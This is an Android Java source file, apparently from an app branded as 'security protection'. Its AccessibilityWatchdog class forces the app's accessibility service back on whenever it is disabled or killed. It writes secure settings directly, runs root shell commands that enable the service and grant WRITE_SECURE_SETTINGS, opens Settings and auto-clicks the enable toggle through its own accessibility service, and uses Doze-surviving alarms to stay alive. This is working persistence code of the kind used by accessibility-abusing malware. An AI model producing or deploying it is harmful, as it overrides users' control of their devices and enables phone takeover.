package com.seguranca.protecao.core;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityManager;

import java.io.DataOutputStream;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * AccessibilityWatchdog
 *
 * Monitors the accessibility service and resurrects it through multiple
 * escalating strategies when it's found dead. Android kills accessibility
 * services after ~1 hour under strict battery policy, or after crashes.
 *
 * Strategy chain (in order):
 *   1. Soft re-enable via WRITE_SECURE_SETTINGS (if granted — works on rooted/ADB)
 *   2. Root shell: `settings put secure enabled_accessibility_services <component>`
 *   3. Navigate to Settings > Accessibility > our service → auto-click Enable
 *   4. AlarmManager exact alarm to re-check after next screen-on
 *
 * Architecture:
 *   - ScheduledExecutorService polls every CHECK_INTERVAL_MS
 *   - SCREEN_ON BroadcastReceiver forces immediate check after screen wakes
 *   - AlarmManager.setExactAndAllowWhileIdle keeps alive through Doze
 *   - AtomicInteger tracks consecutive failures for escalation
 *
 * Integration:
 *   AccessibilityWatchdog watchdog = AccessibilityWatchdog.getInstance(ctx);
 *   watchdog.start("com.seguranca.protecao/.UiAssistBridge");
 *   // In onDestroy: watchdog.stop();
 */
public final class AccessibilityWatchdog {

    private static final String TAG = "A11yWatchdog";

    // ── Config ─────────────────────────────────────────────────────────────────
    private static final long CHECK_INTERVAL_MS   = 30_000L;   // 30s poll
    private static final long DOZE_ALARM_INTERVAL = 45_000L;   // 45s alarm
    private static final int  MAX_SOFT_ATTEMPTS   = 2;         // before escalating
    private static final String ACTION_WATCHDOG_ALARM =
            "com.seguranca.protecao.WATCHDOG_ALARM";

    // ── Singleton ──────────────────────────────────────────────────────────────
    private static volatile AccessibilityWatchdog INSTANCE;
    public static AccessibilityWatchdog getInstance(Context ctx) {
        if (INSTANCE == null) {
            synchronized (AccessibilityWatchdog.class) {
                if (INSTANCE == null) INSTANCE = new AccessibilityWatchdog(ctx.getApplicationContext());
            }
        }
        return INSTANCE;
    }

    // ── Fields ─────────────────────────────────────────────────────────────────
    private final Context               ctx;
    private final AccessibilityManager  a11yMgr;
    private final Handler               mainHandler = new Handler(Looper.getMainLooper());

    private String                      componentName;  // "pkg/.Class"
    private volatile boolean            running      = false;
    private final AtomicInteger         failStreak   = new AtomicInteger(0);
    private final AtomicBoolean         inRecovery   = new AtomicBoolean(false);

    private ScheduledExecutorService    executor;
    private ScheduledFuture<?>          checkFuture;
    private BroadcastReceiver           screenReceiver;
    private AlarmManager                alarmMgr;
    private PendingIntent               alarmIntent;

    private AccessibilityWatchdog(Context ctx) {
        this.ctx     = ctx;
        this.a11yMgr = (AccessibilityManager) ctx.getSystemService(Context.ACCESSIBILITY_SERVICE);
        this.alarmMgr = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
    }

    // ── Public API ─────────────────────────────────────────────────────────────

    /**
     * Start the watchdog.
     * @param componentName  full component string e.g. "com.seguranca.protecao/.UiAssistBridge"
     */
    public synchronized void start(String componentName) {
        if (running) return;
        this.componentName = componentName;
        running = true;
        failStreak.set(0);

        // Scheduled poll
        executor = Executors.newSingleThreadScheduledExecutor(r -> {
            Thread t = new Thread(r, "A11yWatchdog");
            t.setDaemon(true);
            t.setPriority(Thread.MIN_PRIORITY);
            return t;
        });
        checkFuture = executor.scheduleWithFixedDelay(
                this::checkAndHeal, 5_000L, CHECK_INTERVAL_MS, TimeUnit.MILLISECONDS);

        // SCREEN_ON → immediate check (accessibility can die while screen was off)
        screenReceiver = new BroadcastReceiver() {
            @Override public void onReceive(Context c, Intent i) {
                executor.schedule(AccessibilityWatchdog.this::checkAndHeal,
                        2_000L, TimeUnit.MILLISECONDS);
            }
        };
        IntentFilter f = new IntentFilter();
        f.addAction(Intent.ACTION_SCREEN_ON);
        f.addAction(Intent.ACTION_USER_PRESENT);
        ctx.registerReceiver(screenReceiver, f);

        // AlarmManager exact — survives Doze
        scheduleDozeAlarm();

        Log.i(TAG, "Watchdog started → " + componentName);
    }

    public synchronized void stop() {
        running = false;
        if (checkFuture != null) { checkFuture.cancel(false); checkFuture = null; }
        if (executor    != null) { executor.shutdownNow();    executor    = null; }
        if (screenReceiver != null) {
            try { ctx.unregisterReceiver(screenReceiver); } catch (Exception ignored) {}
            screenReceiver = null;
        }
        cancelDozeAlarm();
        Log.i(TAG, "Watchdog stopped");
    }

    /** Called from AlarmReceiver when a WATCHDOG_ALARM fires. */
    public void onAlarm() {
        if (!running) return;
        Log.d(TAG, "Doze alarm fired — checking...");
        if (executor != null) executor.submit(this::checkAndHeal);
        scheduleDozeAlarm(); // reschedule next
    }

    // ── Check & Heal ───────────────────────────────────────────────────────────

    private void checkAndHeal() {
        if (!running) return;
        try {
            if (isServiceRunning()) {
                // Alive — reset streak
                if (failStreak.get() > 0) {
                    Log.i(TAG, "Service alive again after " + failStreak.get() + " failures");
                    failStreak.set(0);
                    inRecovery.set(false);
                }
                return;
            }

            int streak = failStreak.incrementAndGet();
            Log.w(TAG, "Service dead (streak=" + streak + ") — starting recovery");

            if (inRecovery.compareAndSet(false, true)) {
                recover(streak);
            }
        } catch (Exception e) {
            Log.e(TAG, "Watchdog check error: " + e.getMessage());
        }
    }

    private void recover(int streak) {
        // Strategy 1: WRITE_SECURE_SETTINGS (ADB/system grant)
        if (streak <= MAX_SOFT_ATTEMPTS) {
            if (trySoftEnable()) { inRecovery.set(false); return; }
        }

        // Strategy 2: Root shell
        if (tryRootEnable()) { inRecovery.set(false); return; }

        // Strategy 3: Navigate to settings and auto-click
        mainHandler.post(this::tryNavigateToSettings);

        // inRecovery cleared after a delay to allow settings nav to work
        mainHandler.postDelayed(() -> inRecovery.set(false), 8_000L);
    }

    // ── Strategy 1: WRITE_SECURE_SETTINGS ─────────────────────────────────────

    private boolean trySoftEnable() {
        try {
            String current = Settings.Secure.getString(
                    ctx.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);

            String target = componentName;
            String next;

            if (current == null || current.isEmpty()) {
                next = target;
            } else if (current.contains(target)) {
                // Already listed — the service may have crashed. Try toggling.
                String stripped = current.replace(target, "").replaceAll("^:|:$|::", ":");
                Settings.Secure.putString(ctx.getContentResolver(),
                        Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, stripped.isEmpty() ? target : stripped + ":" + target);
                Log.i(TAG, "SOFT: toggled service listing");
                return true; // optimistic
            } else {
                next = current + ":" + target;
            }

            Settings.Secure.putString(ctx.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, next);
            Settings.Secure.putInt(ctx.getContentResolver(),
                    Settings.Secure.ACCESSIBILITY_ENABLED, 1);
            Log.i(TAG, "SOFT: enabled via WRITE_SECURE_SETTINGS");
            return true;
        } catch (SecurityException e) {
            Log.d(TAG, "SOFT failed (no WRITE_SECURE_SETTINGS): " + e.getMessage());
            return false;
        } catch (Exception e) {
            Log.d(TAG, "SOFT error: " + e.getMessage());
            return false;
        }
    }

    // ── Strategy 2: Root shell ─────────────────────────────────────────────────

    private boolean tryRootEnable() {
        DataOutputStream os = null;
        try {
            Process su = Runtime.getRuntime().exec("su");
            os = new DataOutputStream(su.getOutputStream());

            String pkg  = ctx.getPackageName();
            String comp = componentName.replace(pkg + "/", pkg + "/.");

            // Enable accessibility via settings binary + pm grant for good measure
            os.writeBytes("settings put secure enabled_accessibility_services " + comp + "\n");
            os.writeBytes("settings put secure accessibility_enabled 1\n");
            os.writeBytes("pm grant " + pkg + " android.permission.WRITE_SECURE_SETTINGS 2>/dev/null\n");
            os.writeBytes("exit\n");
            os.flush();

            int exit = su.waitFor();
            Log.i(TAG, "ROOT: exit=" + exit);
            return exit == 0;

        } catch (Exception e) {
            Log.d(TAG, "ROOT failed: " + e.getMessage());
            return false;
        } finally {
            if (os != null) try { os.close(); } catch (Exception ignored) {}
        }
    }

    // ── Strategy 3: Navigate to accessibility settings ─────────────────────────

    private void tryNavigateToSettings() {
        try {
            // Open accessibility settings for our specific component
            String pkg   = componentName.split("/")[0];
            String clazz = componentName.split("/")[1];
            if (clazz.startsWith(".")) clazz = pkg + clazz;

            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);

            // On Android 9+ we can pre-select the component
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                ComponentName cn = new ComponentName(pkg, clazz);
                intent.putExtra(":settings:show_fragment_args",
                        buildBundle("component_name", cn.flattenToString()));
            }

            ctx.startActivity(intent);
            Log.i(TAG, "NAV: opened accessibility settings");

            // After 3s, attempt auto-click on the first toggle we find
            mainHandler.postDelayed(this::autoClickEnableToggle, 3_000L);

        } catch (Exception e) {
            Log.e(TAG, "NAV failed: " + e.getMessage());
        }
    }

    /** Build a Bundle for intent extras without importing Bundle explicitly. */
    private static android.os.Bundle buildBundle(String key, String val) {
        android.os.Bundle b = new android.os.Bundle();
        b.putString(key, val);
        return b;
    }

    private void autoClickEnableToggle() {
        // This must be called from the main thread; dispatches via UiAssistBridge
        try {
            // Broadcast to our own AccessibilityService telling it to click the
            // first switch/toggle visible in the current window.
            Intent intent = new Intent("com.seguranca.protecao.AUTO_CLICK_TOGGLE");
            ctx.sendBroadcast(intent);
            Log.i(TAG, "NAV: sent auto-click broadcast");
        } catch (Exception e) {
            Log.w(TAG, "auto-click broadcast failed: " + e.getMessage());
        }
    }

    // ── AlarmManager Doze survival ─────────────────────────────────────────────

    private void scheduleDozeAlarm() {
        if (alarmMgr == null) return;
        try {
            Intent i = new Intent(ACTION_WATCHDOG_ALARM).setPackage(ctx.getPackageName());
            int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                    ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
                    : PendingIntent.FLAG_UPDATE_CURRENT;
            alarmIntent = PendingIntent.getBroadcast(ctx, 0xA11C, i, flags);

            long trigger = SystemClock.elapsedRealtime() + DOZE_ALARM_INTERVAL;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmMgr.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, alarmIntent);
            } else {
                alarmMgr.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, alarmIntent);
            }
        } catch (Exception e) {
            Log.w(TAG, "AlarmManager schedule failed: " + e.getMessage());
        }
    }

    private void cancelDozeAlarm() {
        if (alarmMgr != null && alarmIntent != null) {
            try { alarmMgr.cancel(alarmIntent); } catch (Exception ignored) {}
            alarmIntent = null;
        }
    }

    // ── Service detection ──────────────────────────────────────────────────────

    @SuppressWarnings("deprecation")
    private boolean isServiceRunning() {
        if (a11yMgr == null) return false;
        try {
            List<AccessibilityServiceInfo> running =
                    a11yMgr.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);

            String pkg = componentName.split("/")[0];
            for (AccessibilityServiceInfo info : running) {
                if (info.getResolveInfo().serviceInfo.packageName.equals(pkg)) return true;
            }
        } catch (Exception e) {
            Log.w(TAG, "isServiceRunning error: " + e.getMessage());
        }
        return false;
    }

    // ── AlarmReceiver — register in Manifest ───────────────────────────────────

    /**
     * Register this in AndroidManifest.xml:
     *
     *   <receiver android:name="com.seguranca.protecao.core.AccessibilityWatchdog$AlarmReceiver"
     *             android:exported="false">
     *     <intent-filter>
     *       <action android:name="com.seguranca.protecao.WATCHDOG_ALARM"/>
     *     </intent-filter>
     *   </receiver>
     */
    public static final class AlarmReceiver extends BroadcastReceiver {
        @Override public void onReceive(Context ctx, Intent intent) {
            if (ACTION_WATCHDOG_ALARM.equals(intent.getAction())) {
                AccessibilityWatchdog.getInstance(ctx).onAlarm();
            }
        }
    }
}
